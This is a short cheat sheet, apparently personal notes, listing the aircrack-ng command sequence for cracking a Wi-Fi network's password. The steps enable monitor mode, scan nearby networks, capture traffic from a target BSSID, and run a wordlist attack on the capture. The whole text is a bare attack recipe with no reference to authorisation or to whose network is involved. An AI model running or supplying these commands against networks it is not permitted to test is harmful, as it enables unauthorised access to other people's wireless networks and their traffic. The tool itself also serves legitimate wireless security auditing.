/* aircrack-ng

sudo ifconfig wlan0 up

sudo airmon-ng start wlan0

sudo airodump-ng wlan0mon

sudo airodump-ng -c CHANNEL --bssid BSSID -w capture.cap wlan0mon

sudo aircrack-ng -w mot_de_passe.lst capture.cap

